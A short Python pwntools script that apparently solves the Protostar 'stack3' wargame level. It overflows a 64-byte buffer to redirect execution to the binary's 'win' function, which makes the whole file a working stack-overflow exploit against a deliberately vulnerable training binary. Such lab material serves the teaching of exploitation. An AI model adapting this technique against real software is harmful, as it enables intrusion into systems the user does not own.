#!/usr/bin/python
from pwn import *
from ssh import *
import os

binarypath='/opt/protostar/bin/stack3'
sh.download(binarypath)
elf=ELF('./stack3')
p=sh.run(binarypath)
win=elf.symbols['win']
payload="A"*64+p32(win)
p.sendline(payload)
print p.recvall()
os.system('rm stack3')